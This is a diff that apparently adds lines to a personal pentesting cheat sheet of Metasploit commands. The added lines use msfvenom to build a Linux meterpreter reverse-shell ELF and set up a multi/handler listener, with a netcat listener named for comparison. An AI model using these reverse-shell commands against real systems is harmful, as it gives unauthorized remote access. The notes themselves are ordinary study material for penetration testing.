@@ -13,7 +13,12 @@ workspace -a {name}
 db_nmap -sV -p- {ip}
 use {exploit}
 hosts -R
-
+msfvenom #generate shell binarys fe: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f elf > rev_shell.elf
+use exploit/multi/handler #same as nc -lvnp {port}
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost {ip}
+set lport 4444
+ctrl+z #session in the background to use for later
 
 kerbrute
 go witnes
